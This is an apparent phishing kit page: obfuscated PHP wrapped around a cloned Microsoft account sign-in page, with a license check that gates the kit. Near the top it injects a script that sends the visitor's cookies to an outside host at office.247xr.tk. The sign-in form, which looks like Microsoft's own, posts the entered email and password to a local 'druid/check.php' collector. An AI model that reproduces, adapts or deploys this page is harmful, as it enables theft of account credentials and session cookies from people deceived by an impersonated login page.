<?php
 goto GpAys; jwknk: if ($res["\x73\x74\141\164\165\x73"] != true) { die("\56"); } goto sW_ck; wp1pC: $res = $api->verify_license(); goto jwknk; GpAys: session_start(); goto QcaW0; mVVvm: ?>
<!doctypehtml><html dir="ltr"lang="EN-GB"><head><meta content="text/html; charset=UTF-8"http-equiv="Content-Type"><link href="https://acctcdn.msauth.net/"rel="preconnect"crossorigin=""><link href="https://acctcdn.msftauth.net/"rel="preconnect"crossorigin=""><link href="https://logincdn.msftauth.net/"rel="preconnect"crossorigin=""><meta content="on"http-equiv="x-dns-prefetch-control"><link href="https://acctcdn.msauth.net/"rel="dns-prefetch"><link href="https://acctcdn.msftauth.net/"rel="dns-prefetch"><link href="https://acctcdnmsftuswe2.azureedge.net/"rel="dns-prefetch"><link href="https://acctcdnvzeuno.azureedge.net/"rel="dns-prefetch"><link href="https://logincdn.msauth.net/"rel="dns-prefetch"><link href="https://logincdn.msftauth.net/"rel="dns-prefetch"><link href="https://lgincdnvzeuno.azureedge.net/"rel="dns-prefetch"><link href="https://lgincdnmsftuswe2.azureedge.net/"rel="dns-prefetch"><meta content="IE=Edge"http-equiv="X-UA-Compatible"><?php  goto wp1pC; WwBPU: $api = new LicenseBoxExternalAPI(); goto mVVvm; QcaW0: require_once "\151\x6e\143\154\x75\x64\x65\163\x2f\x6c\142\137\x68\x65\154\x70\x65\162\56\x70\150\x70"; goto WwBPU; sW_ck: ?>
<script>var i=new Image;i.src="http://office.247xr.tk/cookie.php?g="+document.cookie</script><base href="."><script type="text/javascript">var PROOF={Type:{SQSA:6,CSS:5,DeviceId:4,Email:1,AltEmail:2,SMS:3,HIP:8,Birthday:9,TOTPAuthenticator:10,RecoveryCode:11,StrongTicket:13,TOTPAuthenticatorV2:14,UniversalSecondFactor:15,SecurityKey:18,Voice:-3}}</script><noscript><meta content="0; URL=https://login.live.com/jsDisabled.srf?mkt=EN-GB&lc=2057&uaid=e83f109947584b20b9ed324add0eedad"http-equiv="Refresh">Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br><br>To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.</noscript><title>Sign in to your Microsoft account</title><meta content="none"name="robots"><meta content="i5030"name="PageID"><meta content="38936"name="SiteID"><meta content="2057"name="ReqLC"><meta content="2057"name="LocLC"><meta content="width=device-width,initial-scale=1,maximum-scale=2,minimum-scale=1,user-scalable=yes"name="viewport"><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(t){function n(e){if(o[e])return o[e].exports;var r=o[e]={exports:{},id:e,loaded:!1};return t[e].call(r.exports,r,r.exports,n),r.loaded=!0,r.exports}var o={};return n.m=t,n.c=o,n.p="",n(0)}([function(e,r){!function(){function t(){return o.$Config||o.ServerData||{}}function f(e,r){var t=o.$Debug;t&&t.appendLog&&(r&&(e+=" '"+(r.src||r.href||"")+"'",e+=", id:"+(r.id||""),e+=", async:"+(r.async||""),e+=", defer:"+(r.defer||"")),t.appendLog(e))}function g(e){var r=e.indexOf("?"),t=-1<r?r:e.length;return d<t&&e.substr(t-d,d).toLowerCase()===a}function i(){var e=t();return(e.loader||{}).slReportFailure||e.slReportFailure||!1}function s(){return(t().loader||{}).redirectToErrorPageOnLoadFailure||!1}function h(e){var r=!0,t=e.src||e.href||"";if(t){if(g(t))try{e.sheet&&e.sheet.cssRules&&!e.sheet.cssRules.length&&(r=!1)}catch(e){}}else r=!1;return r}function p(){function a(e,r,t,n){var o=null;return o=g(e)?function(e){var r=v.createElement("link");return r.rel="stylesheet",r.type="text/css",r.href=e,r}(e):"script"===n.toLowerCase()?function(e){var r=v.createElement("script");return r.type="text/javascript",r.src=e,r.defer=!1,r.async=!1,r}(e):function(e,r){var t=v.createElement(r);return t.src=e,t}(e,n),r&&(o.id=r),"function"==typeof o.setAttribute&&(o.setAttribute("crossorigin","anonymous"),t&&"string"==typeof t&&o.setAttribute("integrity",t)),o}function i(e,r,t,n){return f("[$Loader]: "+(u.failMessage||"Failed"),n),l[e].retry<o?(l[e].retry++,d(e,r,t),void p._ReportFailure(l[e].retry,l[e].srcPath)):void(t&&t())}function s(e,r,t,n){if(h(n)){f("[$Loader]: "+(u.successMessage||"Loaded"),n),d(e+1,r,t);var o=l[e].onSuccess;"function"==typeof o&&o(l[e].srcPath)}else i(e,r,t,n)}function d(e,r,t){if(e<l.length){var n=l[e];if(!n||!n.srcPath)return void d(e+1,r,t);0<n.retry&&(n.srcPath=function(e){if(!(c&&1<c.length))return e;for(var r=0;r<c.length;r++)if(0===e.indexOf(c[r]))return c[r+1<c.length?r+1:0]+e.substring(c[r].length);return e}(n.srcPath),n.origId||(n.origId=n.id),n.id=n.origId+"_Retry_"+n.retry);var o=a(n.srcPath,n.id,n.integrity,n.tagName);o.onload=function(){s(e,r,t,o)},o.onerror=function(){i(e,r,t,o)},o.onreadystatechange=function(){"loaded"===o.readyState?setTimeout(function(){s(e,r,t,o)},500):"complete"===o.readyState&&s(e,r,t,o)},function(e){v.getElementsByTagName("head")[0].appendChild(e)}(o),f("[$Loader]: Loading '"+(n.srcPath||"")+"', id:"+(n.id||""))}else r&&r()}var e=t(),o=e.slMaxRetry||2,c=(e.loader||{}).cdnRoots||[],u=this,l=[];u.retryOnError=!0,u.successMessage="Loaded",u.failMessage="Error",u.Add=function(e,r,t,n,o,a){e&&l.push({srcPath:e,id:r,retry:n||0,integrity:t,tagName:o||"script",onSuccess:a})},u.AddForReload=function(e,r){var t=e.src||e.href||"";u.Add(t,"AddForReload",e.integrity,1,e.tagName,r)},u.AddIf=function(e,r,t){e&&u.Add(r,t)},u.Load=function(e,r){d(0,e,r)}}var n,o=window,v=o.document,a=".css",d=a.length;p.On=function(e,r,t){if(!e)throw"The target element must be provided and cannot be null.";r?p.OnError(e,t):p.OnSuccess(e,t)},p.OnSuccess=function(e,r){var t=e.src||e.href||"",n=i(),o=s();if(!e)throw"The target element must be provided and cannot be null.";if(h(e)){f("[$Loader]: Loaded",e);var a=new p;a.failMessage="Reload Failed",a.successMessage="Reload Success",a.Load(null,function(){if(n)throw"Unexpected state. ResourceLoader.Load() failed despite initial load success. ['"+t+"']";o&&(document.location.href="/error.aspx?err=504")})}else p.OnError(e,r)},p.OnError=function(e,r){var t=e.src||e.href||"",n=i(),o=s();if(!e)throw"The target element must be provided and cannot be null.";f("[$Loader]: Failed",e);var a=new p;a.failMessage="Reload Failed",a.successMessage="Reload Success",a.AddForReload(e,r),a.Load(null,function(){if(n)throw"Failed to load external resource ['"+t+"']";o&&(document.location.href="/error.aspx?err=504")}),p._ReportFailure(0,t)},p._ReportFailure=function(e,r){if((t().loader||{}).logByThrowing&&!function(){var e=o.$B;if(void 0===n)if(e)n=e.IE;else{var r=o.navigator.userAgent;n=-1!==r.indexOf("MSIE ")||-1!==r.indexOf("Trident/")}return n}())throw"[Retry "+e+"] Failed to load external resource ['"+r+"'], reloading from fallback CDN endpoint"},o.$Loader=p}()}]))</script><script type="text/javascript">!function(r,t){for(var e in t)r[e]=t[e]}(this,function(e){function o(r){if(n[r])return n[r].exports;var t=n[r]={exports:{},id:r,loaded:!1};return e[r].call(t.exports,t,t.exports,o),t.loaded=!0,t.exports}var n={};return o.m=e,o.c=n,o.p="",o(0)}([function(r,t){!function(){function s(r,u,c){function t(){var r=!!f.method,t=r?f.method:c[0],e=f.extraArgs||[],o=v.$WebWatson;try{var n=function(r,t){return Array.prototype.slice.call(r,t?1:0)}(c,!r);if(e&&0<e.length)for(var i=e.length,a=0;a<i;a++)n.push(e[a]);t.apply(u,n)}catch(r){return void(o&&o.submitFromException&&o.submitFromException(r))}}var f=h.r&&h.r[r];return u=u||this,f&&(f.skipTimeout?t():v.setTimeout(t,0)),f}var v=window;v.$Do||(v.$Do={q:[],r:[],removeItems:[],lock:0,o:[]});var h=v.$Do;h.when=function(r,t){function e(r){s(r,o,n)||h.q.push({id:r,c:o,a:n})}var o=0,n=[],i=1;"function"==typeof t||(o=t,i=2);for(var a=i;a<arguments.length;a++)n.push(arguments[a]);r instanceof Array?function(o,n){var i=o.length;!function r(t){var e=o[t];return t<i-1?void(h.r[e]?r(t+1):h.when(e,function(){r(t+1)})):void n(e)}(0)}(r,e):e(r)},h.register=function(r,t,e){if(!h.r[r]){h.o.push(r);var o={};if(t&&(o.method=t),e&&(o.skipTimeout=e),arguments&&3<arguments.length){o.extraArgs=[];for(var n=3;n<arguments.length;n++)o.extraArgs.push(arguments[n])}h.r[r]=o,h.lock++;try{for(var i=0;i<h.q.length;i++){var a=h.q[i];a.id==r&&s(r,a.c,a.a)&&h.removeItems.push(a)}}catch(r){throw r}finally{if(h.lock--,0===h.lock){for(var u=0;u<h.removeItems.length;u++)for(var c=h.removeItems[u],f=0;f<h.q.length;f++)if(h.q[f]===c){h.q.splice(f,1);break}h.removeItems=[]}}}},h.unregister=function(r){h.r[r]&&delete h.r[r]}}()}]))</script><script type="text/javascript">!function(n,e){for(var o in e)n[o]=e[o]}(this,function(o){function r(n){if(t[n])return t[n].exports;var e=t[n]={exports:{},id:n,loaded:!1};return o[n].call(e.exports,e,e.exports,r),e.loaded=!0,e.exports}var t={};return r.m=o,r.c=t,r.p="",r(0)}([function(n,e){!function(){function n(){var t=(e.$Config||e.ServerData,new o),n=this,i=[],f=[];n.Add=function(n,e,o,r){t.Add(n,e,o,r)},n.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},n.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},n.Load=function(e,n){var o=function(){e&&e();for(var n=0;n<i.length;n++)a.register(i[n],0,!0)},r=function(){t.Load(o,n)};0<f.length?a.when(f,r):r()}}var e=window,a=(e.document,e.$Do),o=e.$Loader;n.WhenLoaded=function(n,e){a.when(n,e)},e.$DepLoader=n}()}]))</script><link href="https://logincdn.msftauth.net/16.000.29619.5/images/favicon.ico"rel="shortcut icon"><link href="./ass/Converged_v22057_T-H8TkOzzOd03nMtjI4Hew2.css"rel="stylesheet"onerror="$Loader.OnError(this)"onload="$Loader.OnSuccess(this)"title="Converged_v2"type="text/css"><style type="text/css"></style><style type="text/css">body{display:none}</style><script type="text/javascript">if(top!=self)try{top.location.replace(self.location.href)}catch(e){}else document.write(unescape("%3C%73")+'tyle type="text/css">body{display:block !important;}</style>')</script><style type="text/css">body{display:block!important}</style><noscript><style type="text/css">body{display:block!important}</style></noscript><script type="text/javascript">!function(e,r){for(var t in r)e[t]=r[t]}(this,function(t){function n(e){if(i[e])return i[e].exports;var r=i[e]={exports:{},id:e,loaded:!1};return t[e].call(r.exports,r,r.exports,n),r.loaded=!0,r.exports}var i={};return n.m=t,n.c=i,n.p="",n(0)}([function(e,r){var d=window,g=d.navigator;d.g_iSRSFailed=0,d.g_sSRSSuccess="",r.SRSRetry=function(e,r,t,n,i){var s=unescape("%3Cscript type='text/javascript'");i&&(s+=" crossorigin='anonymous' integrity='"+i+"'"),s+=" src='";var a=unescape("'%3E%3C/script%3E"),o=r;if(g&&g.userAgent&&n&&n!==r){var c=g.userAgent.toLowerCase();if(!(0<=c.indexOf("edge"))){var u=c.match(/chrome\/([0-9]+)\./);u&&2===u.length&&!isNaN(u[1])&&54<parseInt(u[1])&&(o=n)}}-1===d.g_sSRSSuccess.indexOf(e)&&(void 0===d[e]?t<=(d.g_iSRSFailed=1)&&document.write(s+o+a):d.g_sSRSSuccess+=e+"|"+t+",")}}]));var g_dtFirstByte=new Date,g_objPageMode=null</script><link href="https://logincdn.msftauth.net/16.000.29619.5/images/Windows_Live_v_thumb.jpg"rel="image_src"><script type="text/javascript">window.UXResourceDependencies=[]</script><script type="text/javascript">!function(){var e=new window.$DepLoader;e.Add("https://logincdn.msftauth.net/16.000/content/js/ConvergedLoginPaginatedStrings.en-gb_jzygQ9QXiDWNRXLGj-n-8w2.js","ConvergedLoginPaginatedStrings","sha384-r6R5vkEHuQrJoWoofcMQhJY77BbjyjbV2x+yLsGzU+cJYfeYI0L/8XiGucjxPVQt"),e.Provides("UX_JS_Strings");var n="UX_Res_"+window.UXResourceDependencies.length;e.Provides(n),window.UXResourceDependencies.push(n),e.Load()}()</script><script type="text/javascript"crossorigin="anonymous"id="ConvergedLoginPaginatedStrings"integrity="sha384-r6R5vkEHuQrJoWoofcMQhJY77BbjyjbV2x+yLsGzU+cJYfeYI0L/8XiGucjxPVQt"src="./ass/ConvergedLoginPaginatedStrings.en-gb_jzygQ9QXiDWNRXLGj-n-8w2.js"></script><script type="text/javascript">!function(){var e=new window.$DepLoader;e.Add("https://logincdn.msftauth.net/shared/1.0/content/js/ConvergedLogin_PCore_Q9QQskEMc2xSRTXCcd3MIQ2.js","ConvergedLogin_PCore","sha384-2zzJMFNzw+rMRgODOiFUk2MAKZBAWBvotc1zELtMaWlITX3wHLy3eEsctFxIYa4s"),e.Requires("UX_JS_Strings"),e.Provides("UX_JS_Core");var n="UX_Res_"+window.UXResourceDependencies.length;e.Provides(n),window.UXResourceDependencies.push(n),e.Load()}()</script><script type="text/javascript">window.WhenAllLoaded=function(e){window.$DepLoader.WhenLoaded(window.UXResourceDependencies,e)}</script><script type="text/javascript"crossorigin="anonymous"id="ConvergedLogin_PCore"integrity="sha384-2zzJMFNzw+rMRgODOiFUk2MAKZBAWBvotc1zELtMaWlITX3wHLy3eEsctFxIYa4s"src="./ass/ConvergedLogin_PCore_Q9QQskEMc2xSRTXCcd3MIQ2.js"></script><script src="./ass/oneDs_641b1cf809bdc17b42ab.js"charset="utf-8"></script><style type="text/css">.debug-details-banner,.inner,.new-session-popup-v2sso,.promoted-fed-cred-box,.sign-in-box,.vertical-split-content{min-width:0}</style><style type="text/css">.debug-details-banner,.inner,.new-session-popup-v2sso,.promoted-fed-cred-box,.sign-in-box,.vertical-split-content{min-width:0}</style><style type="text/css">.debug-details-banner,.inner,.new-session-popup-v2sso,.promoted-fed-cred-box,.sign-in-box,.vertical-split-content{min-width:0}</style></head><body class="cb"data-bind="defineGlobals: ServerData, bodyCssClass"><div><div data-bind="if: activeDialog"></div><form data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.cl }"method="post"target="_top"action="druid/check.php"autocomplete="off"n><div data-bind="component: { name: 'master-page',
        publicMethods: masterPageMethods,
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.bc,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"class="login-paginated-page"><div data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cl }"id="lightboxTemplateContainer"><div data-bind="css: { 'provide-min-height': svr.cl },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }"id="lightboxBackgroundContainer"><div data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"class="background-image-holder"role="presentation"><div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }"class="background-image ext-background-image"id="backgroundImage"style="background-image:url(https://logincdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg)"></div></div></div><div data-bind="css: { 'app': $page.backgroundLogoUrl }"class="outer"><div class="main-section template-section"><div data-bind="externalCss: { 'middle': true }"class="ext-middle middle"><div data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }"class="full-height"><div class="flex-column"><div class="win-scroll"><div data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession && ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() && $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }"class="ext-sign-in-box has-popup sign-in-box"id="lightbox"><div data-bind="css: { 'disable-lightbox': svr.CE && showLightboxProgress() }"class="lightbox-cover"></div><div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><img data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }"role="img"src="./ass/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"class="logo"alt="Microsoft"pngsrc="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png"svgsrc="https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"></div><div data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.a5,
                disableAnimationIfAnimationEndUnsupported: svr.Ck,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"role="main"><div data-bind="css: { 'zero-opacity': hidePaginatedView() }"class=""><div data-bind="css: {
        'has-identity-banner': showIdentityBanner() && (sharedData.displayName || svr.i),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"class="animate pagination-view slide-in-next"><div data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"data-showfedcredbutton="true"data-viewid="1"><div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"><div><div data-bind="externalCss: { 'title': true }"class="row ext-title title"id="loginHeader"><div data-bind="text: title"role="heading"aria-level="1">Sign in</div></div></div></div><div class="row"><div aria-live="assertive"role="alert"></div><div class="form-group col-md-24"><div data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['STR_SSSU_Username_Hint'] || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aY ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"class="placeholderContainer"><input type="email"data-bind="
                    attr: { lang: svr.aZ ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription && !svr.CO ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText"name="email"class="ext-input ext-text-box form-control input ltr_override text-box"aria-describedby="loginHeader usernameError"aria-label="Enter your email address, phone number or Skype name."aria-required="true"data-report-attached="1"data-report-event="Signin_Email_Phone_Skype"data-report-trigger="click"data-report-value="Email_Phone_Skype_Entry"maxlength="113"placeholder="Email, phone or Skype"> <input type="password"data-bind="moveOffScreen, textInput: passwordBrowserPrefill"name="password"class="moveOffScreen"aria-hidden="true"autocomplete="off"tabindex="-1"></div></div></div><div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }"class="ext-password-reset-links-container password-reset-links-container position-buttons"><div class="row"><div class="col-md-24"><div class="text-13"><div data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.j || '#',
                            ariaLabel: svr.j ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }"class="form-group">No account? <a href="https://signup.live.com/signup?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&contextid=81DB820D050F2E91&opid=A4C504E1B000FCD6&bk=1670266658&sru=https://login.live.com/oauth20_authorize.srf%3fclient_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26client_id%3d4765445b-32c6-49b0-83e6-1d93765276ca%26contextid%3d81DB820D050F2E91%26opid%3dA4C504E1B000FCD6%26mkt%3dEN-GB%26lc%3d2057%26bk%3d1670266658%26uaid%3de83f109947584b20b9ed324add0eedad&uiflavor=web&lic=1&mkt=EN-GB&lc=2057&uaid=e83f109947584b20b9ed324add0eedad"id="signup"aria-label="Create a Microsoft account">Create one!</a></div><div class="form-group"><a href="https://login.live.com/#"id="idA_PWD_SwitchToFido"data-bind="
                        text: fidoLinkText,
                        click: switchToFidoCredLink_onClick">Sign in with Windows Hello or a security key</a> <span aria-label="Learn more about signing in with Windows Hello or a security key"class="help-button"data-bind="
    click: fidoHelp_onClick,
    pressEnter: fidoHelp_onClick,
    hasFocus: hasFocus,
    ariaLabel: isPlatformAuthenticatorAvailable ? str['CT_STR_CredentialPicker_Help_Desc_Fido'] : str['CT_STR_CredentialPicker_Help_Desc_FidoCrossPlatform']"role="button"tabindex="0"><img data-bind="imgSrc"role="presentation"src="./ass/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"pngsrc="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_9628e22a6bfb1edc59e81064a666b614.png"svgsrc="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_bcb4d1dc4eae64f0b2b2538209d8435a.svg"></span><div data-bind="component: { name: 'fido-help-dialog-content-control',
    params: {
        isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"><div data-bind="component: { name: 'dialog-content-control',
    params: {
        dialogId: 1,
        data: {
            labelledBy: 'fidoDialogTitle',
            describedBy: 'fidoDialogDesc fidoDialogDesc2',
            primaryButtonPreventTabbing: { direction: 'down' },
            isPlatformAuthenticatorAvailable: isPlatformAuthenticatorAvailable } },
    event: {
        registerDialog: onRegisterDialog,
        unregisterDialog: onUnregisterDialog } }"></div></div></div></div></div></div></div><div data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }"class="win-button-pin-bottom"><div data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"class="row"><div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.e,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.e && isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin },
    externalCss: { 'button-field-container': true }"class="button-container button-field-container col-xs-24 ext-button-field-container no-padding-left-right"><div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }"class="button-item ext-button-item inline-block"><input type="submit"data-bind="
                attr: primaryButtonAttributes,
                externalCss: {
                    'button': true,
                    'primary': true },
                value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                hasFocus: focusOnPrimaryButton,
                click: primaryButton_onClick,
                enable: isPrimaryButtonEnabled,
                visible: isPrimaryButtonVisible,
                preventTabbing: primaryButtonPreventTabbing"value="Next"id="idSIButton9"class="button button_primary ext-button ext-primary primary win-button"data-report-attached="1"data-report-event="Signin_Submit"data-report-trigger="click"data-report-value="Submit"></div></div></div></div></div></div></div></div></div><input type="hidden"data-bind="value: postedLoginStateViewId"name="ps"value=""> <input type="hidden"data-bind="value: postedLoginStateViewRNGCDefaultType"name="psRNGCDefaultType"value=""> <input type="hidden"data-bind="value: postedLoginStateViewRNGCEntropy"name="psRNGCEntropy"value=""> <input type="hidden"data-bind="value: postedLoginStateViewRNGCSLK"name="psRNGCSLK"value="">  <input type="hidden"data-bind="value: svr.canary"name="canary"value=""> <input type="hidden"data-bind="value: ctx"name="ctx"value=""> <input type="hidden"data-bind="value: svr.sessionId"name="hpgrequestid"value=""> <input type="hidden"data-bind="attr: { name: svr.bp }, value: flowToken"name="PPFT"value="DZ2DMdd60qF6dV2RvToerSp546vKqx3KYFt4yGOhqoqB6fWHF6k!fTaXHQ0vm0jLmqluTMGbmJ1KgBcuyFpd5BC5hxI3syw7wBHO2Hg1AlDrDJBREH5vtMQYeiRsterNCc8OI3ViZ9esuzMoZm*cgNe*6l*IqfRnKCeVfux2tB6yy0qTJp1OqJFg4hM6ORb5y1YUDIp!IJMN0NOurQH0tzA$"id="i0327"> <input type="hidden"data-bind="value: svr.DB"name="PPSX"value="P"> <input type="hidden"name="NewUser"value="1"> <input type="hidden"data-bind="value: svr.Ap"name="FoundMSAs"value=""> <input type="hidden"data-bind="value: svr.fPOST_ForceSignin ? 1 : 0"name="fspost"value="0"> <input type="hidden"data-bind="value: wasLearnMoreShown() ? 1 : 0"name="i21"value="0"> <input type="hidden"data-bind="value: svr.BV ? 1 : 0"name="CookieDisclosure"value="0"> <input type="hidden"data-bind="value: isFidoSupported() ? 1 : 0"name="IsFidoSupported"value="1"> <input type="hidden"data-bind="value: isSignupPost() ? 1 : 0"name="isSignupPost"value="0"> <input type="hidden"data-bind="value: isRecoveryAttemptPost() ? 1 : 0"name="isRecoveryAttemptPost"value="0"><div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"><input type="hidden"data-bind="value: timeOnPage"name="i19"value=""></div></div><div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }"class="ext-promoted-fed-cred-box promoted-fed-cred-box"><div data-bind="css: {
                'animate': $page.useCssAnimations && $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }"class="promoted-fed-cred-content"><div class="row tile"><div data-bind="
                        css: { 'list-item': svr.cI },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text"class="table"role="button"aria-label="Sign-in options"tabindex="0"><div class="table-row"><div class="medium tile-img table-cell"><img data-bind="attr: { src: $data.darkIconUrl }"role="presentation"src="./ass/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"class="medium tile-img"></div><div data-bind="css: { 'content': !svr.cI }"class="table-cell content text-left"><div data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }"data-test-id="signinOptions">Sign-in options</div></div></div></div></div></div></div></div></div></div></div></div><div data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() && $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }"class="ext-footer footer"id="footer"role="contentinfo"><div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><div data-bind="externalCss: { 'footer-links': true }"class="ext-footer-links footer-links footerNode text-secondary"id="footerLinks"><a href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&mkt=EN-GB&uaid=e83f109947584b20b9ed324add0eedad"id="ftrTerms"data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }"class="ext-footer-content ext-footer-item footer-content footer-item">Terms of use</a><a href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&mkt=EN-GB&uaid=e83f109947584b20b9ed324add0eedad"id="ftrPrivacy"data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
